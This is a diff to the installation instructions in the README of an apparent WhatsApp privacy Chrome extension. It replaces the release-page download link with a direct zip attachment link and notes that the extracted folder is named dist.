@@ -42,11 +42,11 @@ This extension offers:
 
 ## 📦 Installation
 
-1. [Download the latest `.zip` release](https://github.com/Arslan-Ahmad-12/Whatsapp-Privacy-Extension/releases/tag/v1.0.0) from the Releases section.
+1. [Download the latest `.zip` release](https://github.com/user-attachments/files/21677847/whatsapp-privacy-extension-v1.0.0.zip) from the Releases section.
 2. Extract the contents to a folder.
 3. Open Chrome and navigate to `chrome://extensions/`.
 4. Enable **Developer Mode** (top right).
-5. Click **Load Unpacked** and select the extracted folder.
+5. Click **Load Unpacked** and select the extracted folder (with name dist).
 
 The extension icon will appear in your Chrome toolbar. Click to open the settings panel and toggle your preferences.
 
